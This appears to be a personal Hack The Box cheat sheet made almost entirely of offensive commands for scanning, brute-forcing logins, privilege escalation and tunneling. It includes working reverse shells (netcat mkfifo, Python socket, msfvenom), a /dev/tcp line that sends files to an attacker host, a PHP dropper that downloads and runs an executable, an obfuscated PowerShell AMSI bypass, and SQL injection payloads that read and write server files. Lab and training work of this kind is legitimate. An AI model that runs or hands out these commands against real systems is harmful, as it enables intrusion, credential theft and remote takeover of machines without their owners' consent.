# HTB Cheat Sheet
Commands I usually use when doing HTB machines

## Table of Contents
- [Scan](#scan)
- [Enumeration](#enumeration)
- [Bruteforce](#bruteforce)
- [Linux Privilege Escalation](#linux-privilege-escalation)
- [Utilities](#utilities)
- [Reverse Shells](#reverse-shells)
- [Services](#services)
- [Tools](#tools)
- [Wordlists](#wordlists)
- [Miscellaneous](#miscellaneous)
- [Tunneling](#tunneling)
- [Web Exploitation](#web-exploitation)
- [Windows Enumeration & Privilege Escalation](#windows-enumeration-and-privilege-escalation)
  
---

## Scan

### NMAP
```bash
sudo nmap -p- -sV -sC -oA nmap.out $IP --min-rate=5000
```

```bash
nmap -sV -sC $IP -oN basic_scan.nmap
```

#### Scan a specific port
```bash
nmap -sC -sV -p22,80 -Pn -oN nmap $IP
```

```bash
sudo nmap -p22,80 -sV -sC -A -oN scan/open-tcp-ports.txt -sT $ip
```

### Rustscan
```bash
sudo rustscan -u 6500 -b 3000 -a $IP -sC -sV -oN scan.txt
```

---

## Enumeration

### Directory Fuzzing

#### Gobuster
```bash
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u $IP
```

```bash
gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt -o output.txt
```

```bash
gobuster dir -e -t50 -q -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $IP
```

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u $url -o gobuster.out
```

#### FFUF
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u <URL>/FUZZ
```

#### Feroxbuster
```bash
feroxbuster -u <URL> --force-recusrion -C 404 -m GET,POST 
```

#### Fuzzing subdomains
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.DOMAIN" -u <URL>
```

```bash
ffuf -c -ac -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.DOMAIN" -u <URL>
```

```bash
ffuf -u <URL>/FUZZ -X POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fs 50
```

- filter by size

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.DOMAIN" -u <URL> -fs {size}
```

---

## Bruteforce

### Login Bruteforce
#### Hydra bruteforce login

```bash
hydra -l $user -P /usr/share/wordlists/rockyou.txt -f $IP http-get /admin
```

```bash
hydra -t 1 -V -f -l $user -P /usr/share/wordlists/rockyou.txt $ip smb
```

```bash
hydra -l $user -P list.txt $ip ftp
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.118.60 http-post-form "/admin/:user=admin&pass=^PASS^:Username or password invalid"
```

#### Bruteforce pop3 creds

```bash
hydra -L usernames_list.txt -P passwords_list.txt pop3://<ip>
```

#### Bruteforce wp-login using hydra and wpscan

```bash
hydra -L usernames_list.txt -P $password <ip> -V http-form-post '/wp-login:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
```

```bash
hydra -l <username> -P <passwords.txt> <ip> -V http-form-post "/wp-login:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30
```

```bash
wpscan -v -U $wordlist -P $wordlist --url <URL/wp-login.php>
```

#### username bruteforce using FFUF

```bash
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u <URL> -mr "username already exists"
```

#### bruteforce VNC using hydra

```bash
hydra -s 5900 -P /usr/share/wordlists/rockyou.txt vnc://<ip>
```

### Bruteforce Procs
```bash
for i in $(seq 900 1000); do curl $IP:<port>/?page=../../../../proc/$i/cmdline -o -; echo "PID => $i"; done
```

### Bruteforce OTP code
```bash
ffuf -c -u '<http://<ip>:<port>/otp-auth>' -H 'Content-Type: application/json' -X POST -d '{"otp":"FUZZ"}' -fr '{"success": "false"}' -w digits -od otp_out where digits was a file with all 4-digit pins and otp_out was an empty dir
```

---

## Linux Privilege Escalation
### Crons

```bash
cat /etc/crontab
```

### getcap

```bash
getcap -r / 2>/dev/null
```

### doas

```bash
doas -u root /bin/bash
```

### Find Running services

```bash
netstat -ant
```

```bash
netstat -tulpen
```

```bash
netstat -an -p tcp
```

### sockets

```bash
ss -tlp
```

### Python debugger [pdb]

```python
import pdb
```

—> we can execute any code in the debugger

### PATH Hijacking

```bash
echo '/bin/bash' > systemctl
chmod +x systemctl
export PATH=.:$PATH
```

---

## Utilities
### Random Commands
#### mtu speed

```bash
sudo ifconfig tun0 mtu 1200
```

#### send a file from victim machine to attacker machine

```bash
cat $file > /dev/tcp/<attacker ip>/<port>
```

---

### Find Command
##### Listing files owned by a group

```bash
find / -type f -group users 2>/dev/null
```

##### Search for SUID files

```bash
find / -user root -perm -4000 -print 2>/dev/null
```

##### using Find to find SUID binaries for root

```bash
find / -perm +6000 2>/dev/null | grep '/bin'
```

### JohnTheRipper
Rules file

```markdown
/etc/john/john.conf
```

example rule

```markdown
[List.Rules:$name]
Az"[0-9][0-9]"
```

### ASC / GPG Keys
```bash
gpg --import private.key
```

```bash
gpg --decrypt fragment.asc
```

---

## Reverse Shells

### mkfifo
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
```

### python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Pentester-monkey
[https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

### High On coffee
[https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

### Payloadallthings
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### XCT shell
```php
<?php
    $data = file_get_contents('<http://10.10.14.20:8000/xc.exe>');
    file_put_contents('C:\\\\programdata\\\\xc_10.10.14.20_9001.exe' . $data);
    system("C:\\\\programdata\\\\xc_10.10.14.20_9001.exe");
?>
```

[https://github.com/xct/xc](https://github.com/xct/xc)

```bash
./xc -l -p 9001
```

### shellcat (my tool)
https://github.com/seriotonctf/shellcat

---

### Obfuscated PowerShell reverse shell
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

### SharpEvader

[https://github.com/Xyan1d3/SharpEvader](https://github.com/Xyan1d3/SharpEvader)

```bash
python3 sharpevader.py -p windows/x64/meterpreter/reverse_tcp -lh tun0 -lp 9001
```

### msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx -o exploit.aspx
```

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00\x25\x26" -f python -v shellcode
```

---

## Services
### SMB
#### List shares

```bash
smbclient -L //<IP>
```

#### Connect to a share
```bash
smbclient //$IP/$share
```

```bash
smbclient -U $user \\\\$ip\\$share
```

#### download a full folder from smb

```bash
smb: \\> recurse ON
smb: \\> prompt OFF
smb: \\> mget *
```

#### copy a file over an smb server

run on attacker machine

```bash
smbserver.py share . -smb2support
```

run on target machine

```bash
copy <filename> \\\\<IP>\\share\\
```

### FTP
#### connect to ftp via url

```bash
<ftp://$user:$password@$domain> or $ip
example:
?u=ftp://user:heightofsecurity123!@forge.htb
```

#### move to the ftp local directory from ftp

```bash
lcd ftp
```

### SSH
#### Get a file from SSH server

```bash
scp -P22  user@IP:filename .
```

#### Send file via ssh

```bash
scp $filename $user@$IP:.
```

#### SCP a folder to your local machine

```bash
scp -r $user@$IP:/var/www/html .
```

#### Hydra username/password bruteforce

```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

```bash
hydra -l <username> -P <wordlist> $IP -t 4 ssh
```

#### Tricks to connect to SSH

grab your SSH key and add it to the `authorized_keys` file inside the .ssh folder in the target machine
```bash
ssh-keygen -f mykey
```

#### SSH Tunneling

```bash
ssh <USER>@<IP> -L <LOCAL PORT>:127.0.0.1:<LOCAL PORT>
```

### RDP
```bash
xfreerdp /u:$user /d:WORKGROUP /p:$pass /v:$ip
```

### WordPress
```bash
wpscan --api-token '$your_token_here' --url $URL -U $user -P $password [ or password list ] 
```

```bash
wpscan --url $URL -e ap,u
```

### MySQL
Non-Interactive command
```bash
mysql -u $user -p '$pass' -D $database -e '$command;'
```

### SNMP
```bash
snmpwalk -v 2c -c public $IP
```

#### common vuln

get telnet password using snmp
```bash
snmpget -v 1 -c public <IP> .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

Ref : [http://www.irongeek.com/i.php?page=security/networkprinterhacking](http://www.irongeek.com/i.php?page=security/networkprinterhacking)

### Docker
```bash
docker pull [image name]
```

```bash
docker run [image name]
```

```bash
docker inspect [image name]
```

#### run docker interactive

```bash
docker run -it [image]
```

#### check image history

```bash
docker history [image]
```

```bash
docker history --no-trunc [image]
```

#### save layers

```bash
docker save [image] -o layers.tar
```

#### extract docker layers

- https://github.com/micahyoung/docker-layer-extract

### Git
To see previous commits

```bash
git show
```

Get most recent commits -1

```bash
git diff HEAD~1
```

### NFS
```bash
sudo mount -t nfs <IP>: ./tmp
```

### Redis
```bash
redis-cli -h <IP> -a '$secret'
```

#### list keys
```bash
KEYS *
```

#### get a specific key
```bash
LRANGE authlist 1 100
```

### MongoDB
#### start mongo

```markdown
mongo
```

#### show the databases

```markdown
show dbs
```

#### show tables inside the database

```markdown
show tables
```

#### find content of a table

```markdown
db.$table_name.find()
```

### VNC
Bruteforce login using hydra and msfconsole
- hydra
```bash
hydra -s 5900 -P /usr/share/wordlists/rockyou.txt vnc://<IP>
```

- Using Metasploit
```bash
msf6 > use auxiliary/scanner/vnc/vnc_login 
msf6 auxiliary(scanner/vnc/vnc_login) > set rhosts <rhost>
msf6 auxiliary(scanner/vnc/vnc_login) > set pass_file /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/vnc/vnc_login) > run
```
- Reference: https://www.hackingarticles.in/password-crackingvnc/

Interact with VNC
```bash
vncviewer <IP>
```

### rsync
#### list files

```bash
rsync -av --list-only rsync://<IP>/<sharename> 
```

#### dump files

```bash
rsync -av rsync://<IP>/<sharename> <destnation folder>
```

#### write a file to specific location

```bash
rsync <filename> rsync://sys-internal@<IP>/files/sys-internal/.ssh
```

---

## Tools

### Enumeration Tools
- lse.sh: https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
- linpeas.sh: https://github.com/carlospolop/PEASS-ng/releases/tag/20230808-5e84dec0
- winpeas.exe: https://github.com/carlospolop/PEASS-ng/releases/tag/20230808-5e84dec0
- pspy64: https://github.com/DominicBreuker/pspy/releases

### searchsploit
```bash
searchsploit -m php/webapps/49876.py [module name]
```

### gMSADumper

[https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)

### sucrack: https://github.com/hemp3l/sucrack

### Compiled Binaries

[https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)

[https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

---

## Wordlists

### Seclists
- seclists : https://github.com/danielmiessler/SecLists
- rockyou.txt

### Make a wordlists out of a website

```bash
cewl -w wordlists.cewl $website -d 3
```

### Make lower/upper case wordlist

```bash
cat wordlist.cewl | tr '[:upper:]' '[:lower:]' >> wordlists.cewl
```

### Sort a wordlist

```bash
cat wordlists.cewl | sort -u > sorted.lst
```

---

## Miscellaneous
### TTY Shell Upgrade
#### Spawn a tty shell

```bash
python2 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
script /dev/null -c bash
```

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

```bash
Ctrl + Z
```

```bash
stty raw -echo; fg
```

```bash
stty rows <rows> columns <cols>
```

---

## Tunneling

### Chisel
[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

[https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)

Used here : [https://0xdf.gitlab.io/2022/05/03/htb-antique.html](https://0xdf.gitlab.io/2022/05/03/htb-antique.html)

```bash
python3 -m http.server
```

```bash
cd /tmp
wget $ip/chisel_1.7.7_linux_amd64
chmod +x chisel
```

I’ll run the binary in server mode on my box:

```bash
./chisel_1.7.7_linux_amd64 server -p <port> --reverse
```

Now I’ll connect with chisel from the container:

```bash
./chisel_1.7.7_linux_amd64 client $my_ip:<port> R:<port to forward>:<target ip>:<port to forward>
```

### Example

forwarding port `5985` from the docker container

- my machine
```bash
./chisel server -p 5000 --reverse
```

- target machine
```bash
./chisel client <tun0 ip>:<port> R:<port to forward>:<target ip>:<port to forward>
```

### forward 2 ports at the same time

```bash
.\chisel.exe client <ip>:<local port to listen on> R:<first port to forward>:localhost:<first port to forward> R:<second port to forward>:localhost:<second port to forward>
```

### Socat
```bash
./socat tcp-listen:8001,reuseaddr,fork tcp:localhost:8000
```

### Proxy
```bash
export http_proxy=127.0.0.1:8080
```

---

## Web Exploitation
### SQLi
#### Union Payloads
```sql
' UNION SELECT 1,table_name from information_schema.tables where table_schema='webapp'-- -
```

```sql
' UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_schema='webapp' and table_name='queue' -- -
```

#### write to a file

```sql
' UNION SELECT 1,'serioton' INTO OUTFILE '/var/www/html/test.html' -- -
```

#### read a file

```sql
' UNION SELECT 1,load_file('/etc/passwd') -- -
```

---

## Windows Enumeration & Privilege Escalation
The script below looks for Win32 services on the host with unquoted service paths, not in the Windows folder.
```powershell
Get-WmiObject -Class Win32_Service | Where-Object { $*.PathName -inotmatch “`”” -and $*.PathName -inotmatch “:\\\\Windows\\\\” }| Select Name,Pathname
```

- check for user privileges
```powershell
whoami /priv
```

- powershell history file
```powershell
APPDATA\\roaming\\microsoft\\windows\\powershell`\\psreadline\\ConsoleHost_History.txt
```

- check for specific user info
```bash
net user $username
```

- Get the LAPS passwords
```bash
Get-ADComputer -Filter * -Properties *
```

#### check if we can connect via winrm

```bash
crackmapexec winrm <ip> -u <username> -p <password>
```

#### login via evil-winrm

```bash
evil-winrm -i <ip> -u <username> -p <password>
```

### BloodHound

- bloodhound python
```bash
bloodhound-python -c all -u <username> -p <password> -d <domain> -dc <dc> -ns <ip> --disable-pooling -w1 --dns-timeout 30
```

- first start neo4j
```bash
sudo neo4j console
```

- then start bloodhound
```bash
bloodhound
```
